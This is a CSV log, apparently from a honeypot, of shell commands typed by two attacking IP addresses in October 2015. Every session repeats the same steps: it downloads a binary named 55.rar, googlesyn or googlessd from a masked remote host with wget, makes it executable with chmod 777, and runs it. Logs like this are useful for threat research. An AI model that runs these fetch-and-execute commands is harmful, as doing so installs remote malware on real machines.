ip,timestamp,input
"222.186.21.85","2015-10-29 21:20:43","wget -c http://***.***.***.***/55.rar"
"222.186.21.85","2015-10-29 21:20:48","chmod 777 55.rar"
"222.186.21.85","2015-10-29 21:20:54","./55.rar &"
"222.186.21.85","2015-10-29 22:48:18","wget -c http://***.***.***.***/55.rar"
"222.186.21.85","2015-10-29 22:48:24","chmod 777 55.rar"
"222.186.21.85","2015-10-29 22:48:30","./55.rar &"
"222.186.34.75","2015-10-30 06:42:29","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 06:42:32","cd /tmp"
"222.186.34.75","2015-10-30 06:42:36","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 06:42:40","./googlesyn"
"222.186.34.75","2015-10-30 06:42:44","exit"
"222.186.34.75","2015-10-30 06:46:17","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 06:46:20","cd /tmp"
"222.186.34.75","2015-10-30 06:46:25","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 06:46:28","./googlessd"
"222.186.34.75","2015-10-30 06:46:32","exit"
"222.186.34.75","2015-10-30 06:47:38","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 06:47:42","cd /tmp"
"222.186.34.75","2015-10-30 06:47:46","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 06:47:50","./googlesyn"
"222.186.34.75","2015-10-30 06:47:54","exit"
"222.186.34.75","2015-10-30 06:52:06","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 06:52:10","cd /tmp"
"222.186.34.75","2015-10-30 06:52:14","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 06:52:18","./googlessd"
"222.186.34.75","2015-10-30 06:52:22","exit"
"222.186.34.75","2015-10-30 07:07:33","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 07:07:38","cd /tmp"
"222.186.34.75","2015-10-30 07:07:53","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 07:07:53","./googlesyn"
"222.186.34.75","2015-10-30 07:07:53","exit"
"222.186.34.75","2015-10-30 07:07:53","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 07:07:57","cd /tmp"
"222.186.34.75","2015-10-30 07:08:01","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 07:08:05","./googlessd"
"222.186.34.75","2015-10-30 07:08:09","exit"
"222.186.34.75","2015-10-30 07:21:38","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 07:21:42","cd /tmp"
"222.186.34.75","2015-10-30 07:21:46","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 07:21:50","./googlesyn"
"222.186.34.75","2015-10-30 07:21:54","exit"
"222.186.34.75","2015-10-30 07:26:03","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
